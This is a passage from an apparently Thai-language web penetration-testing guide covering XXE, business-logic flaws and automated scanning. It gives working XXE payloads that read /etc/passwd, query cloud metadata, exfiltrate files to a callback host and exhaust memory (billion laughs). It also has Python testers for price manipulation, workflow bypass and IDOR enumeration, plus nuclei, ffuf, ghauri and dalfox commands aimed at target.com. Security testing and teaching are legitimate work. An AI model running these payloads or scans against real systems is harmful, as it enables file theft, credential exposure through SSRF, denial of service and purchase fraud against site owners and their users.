## 13. XXE - XML External Entity

```python
import requests
from typing import List, Optional

class XXETester:
    PAYLOADS = {
        'basic_file_read': """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        
        'ssrf_via_xxe': """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>""",
        
        'blind_oob': lambda callback: f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % exfil SYSTEM "http://{callback}/">
  %exfil;
]>
<root>trigger</root>""",
        
        'parameter_entity': lambda callback, file: f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % data SYSTEM "file://{file}">
  <!ENTITY % oob "<!ENTITY &#x25; send SYSTEM 'http://{callback}/?d=%data;'>">
  %oob;
  %send;
]>
<root>x</root>""",
        
        'billion_laughs': """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY a "a">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<root>&d;</root>"""
    }
    
    def test_endpoint(self, url: str, xml_param: str = None) -> List[Dict]:
        """ทดสอบ XXE บน endpoint"""
        results = []
        headers = {'Content-Type': 'application/xml'}
        
        for name, payload in list(self.PAYLOADS.items())[:3]:  # ผ่านแค่ static payloads
            if callable(payload):
                continue
            
            resp = requests.post(url, data=payload, headers=headers, timeout=15)
            
            if 'root:' in resp.text or '/bin/' in resp.text:  # /etc/passwd leak
                results.append({'type': name, 'file_read': True, 'response': resp.text[:300]})
            elif 'Connection refused' in resp.text or '404' in resp.text:  # SSRF attempt
                results.append({'type': name, 'ssrf_possible': True})
        
        return results

# XXE Payloads สำหรับ PHP filter
PHP_FILTER_XXE = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>"""
```

---

## 14. Business Logic Vulnerabilities

```python
import requests
from typing import Dict, List

class BusinessLogicTester:
    def test_price_manipulation(self, add_to_cart_url: str,
                                 product_id: str, checkout_url: str) -> Dict:
        """ทดสอบการแก้ไขราคา"""
        session = requests.Session()
        
        # เพิ่ม product ด้วยราคา negative
        payloads = [
            {'product_id': product_id, 'price': -100},
            {'product_id': product_id, 'quantity': -1},
            {'product_id': product_id, 'discount': 101},  # > 100% discount
            {'product_id': product_id, 'price': 0.001},
        ]
        
        results = []
        for payload in payloads:
            resp = session.post(add_to_cart_url, json=payload)
            if resp.status_code == 200:
                checkout_resp = session.post(checkout_url)
                if 'success' in checkout_resp.text.lower():
                    results.append({'payload': payload, 'exploit_success': True})
        return {'results': results}
    
    def test_workflow_bypass(self, steps: List[Dict]) -> List[Dict]:
        """ทดสอบการข้ามขั้นตอน"""
        session = requests.Session()
        results = []
        
        # พยายามไปยังขั้นตอนสุดท้ายโดยตรง
        last_step = steps[-1]
        resp = session.post(last_step['url'], json=last_step.get('payload', {}))
        if resp.status_code == 200 and 'success' in resp.text.lower():
            results.append({
                'bypass': 'Direct access to final step',
                'url': last_step['url']
            })
        
        # พยายามเดินหลัง (backward navigation)
        for i in range(len(steps)-1, 0, -1):
            resp = session.post(steps[i]['url'], json=steps[i].get('payload', {}))
            results.append({
                'step': i,
                'url': steps[i]['url'],
                'status': resp.status_code
            })
        
        return results
    
    def test_idor(self, url_template: str, auth_token: str,
                  id_range: range = range(1, 20)) -> List[Dict]:
        """ทดสอบ IDOR"""
        results = []
        headers = {'Authorization': f'Bearer {auth_token}'}
        
        for obj_id in id_range:
            url = url_template.format(id=obj_id)
            resp = requests.get(url, headers=headers)
            if resp.status_code == 200:
                results.append({'id': obj_id, 'accessible': True, 'url': url})
        return results
```

---

## 15. Automated Web Scanning

```bash
# Nuclei - สแกนอัตโนมัติ CVE และช่องโหว่
# ติดตั้ง
nuclei -update
nuclei -update-templates

# Scan target
nuclei -u https://target.com -t cves/ -severity critical,high
nuclei -u https://target.com -t exposures/ -o results.txt
nuclei -l targets.txt -t nuclei-templates/ -c 50

# เจาะ categories เฉพาะ
nuclei -u https://target.com -tags jwt,oauth,graphql
nuclei -u https://target.com -tags sqli,xss,ssrf
nuclei -u https://target.com -tags cve-2021,cve-2022 -severity critical

# FFUF สำหรับ fuzzing
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt
ffuf -u 'https://target.com/login' -X POST -d 'user=FUZZ&pass=test' -w usernames.txt -mc 200

# Arjun - ค้นหา hidden parameters
arjun -u https://target.com/search --get
arjun -u https://target.com/api/user --post --json

# Ghauri - Advanced SQL injection
ghauri -u 'https://target.com/api?id=1' --dbs --batch
ghauri -u 'https://target.com/api?id=1' -D app_db --tables

# Dalfox - XSS scanner
dalfox url 'https://target.com/search?q=test'
dalfox file targets.txt -o xss_results.txt
dalfox url 'https://target.com/search?q=test' --skip-bav --only-poc r,v
```

```python
import subprocess
import json
from typing import List, Dict

class AutomatedWebScanner:
    def run_nuclei(self, target: str, templates: List[str] = None,
                   severity: List[str] = None) -> List[Dict]:
        """Run Nuclei scan"""
        cmd = ['nuclei', '-u', target, '-json', '-silent']
        
        if templates:
            for tmpl in templates:
                cmd.extend(['-t', tmpl])
        
        if severity:
            cmd.extend(['-severity', ','.join(severity)])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            findings = []
            for line in result.stdout.splitlines():
                try:
                    finding = json.loads(line)
                    findings.append({
                        'template': finding.get('template-id'),
                        'name': finding.get('info', {}).get('name'),
                        'severity': finding.get('info', {}).get('severity'),
                        'url': finding.get('matched-at'),
                        'description': finding.get('info', {}).get('description')
                    })
                except json.JSONDecodeError:
                    pass
            return findings
        except subprocess.TimeoutExpired:
            return [{'error': 'Scan timed out'}]
    
    def run_ffuf_dirs(self, target: str, wordlist: str,
                      extensions: List[str] = None) -> List[Dict]:
        """Run FFUF directory enumeration"""
        cmd = ['ffuf', '-u', f'{target}/FUZZ', '-w', wordlist,
               '-mc', '200,201,204,301,302,403,405', '-json']
        
        if extensions:
            cmd.extend(['-e', ','.join(extensions)])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            data = json.loads(result.stdout)
            return data.get('results', [])
        except Exception as e:
            return [{'error': str(e)}]
    
    def generate_scan_report(self, target: str, results: Dict) -> str:
        """สร้างรายงาน"""
        report = f"# Web Security Scan Report\n**Target**: {target}\n\n"
        
        for category, findings in results.items():
            if findings:
                report += f"## {category}\n"
                for finding in findings:
                    if 'severity' in finding:
                        sev = finding.get('severity', 'info').upper()
                        report += f"- **[{sev}]** {finding.get('name', 'Unknown')} - {finding.get('url', '')}\n"
        return report
```

---

## สรุป

| ช่องโหว่ | ความรุนแรง | Tools หลัก |
|--------|------------|----------|
| JWT Algorithm Confusion | Critical | jwt_tool, PortSwigger |
| OAuth Open Redirect | High | Burp Suite, Manual |
| GraphQL Introspection | Medium | graphqlmap, clairvoyance |
| SSTI | Critical | tplmap, Manual |
| Java Deserialization | Critical | ysoserial, gadgetprobe |
| HTTP Request Smuggling | High | smuggler.py, Burp Suite |
| Prototype Pollution | High | Manual, pp-finder |
| XXE | High | Burp Suite, Manual |
| Race Condition | Medium-High | asyncio, Burp Turbo Intruder |
| Web Cache Poisoning | High | param-miner, Manual |

---

← [Part 96: Threat Intelligence](Part-96-Threat-Intelligence.md) | [Part 98: Zero-Day Research](Part-98-Zero-Day-Research.md) →
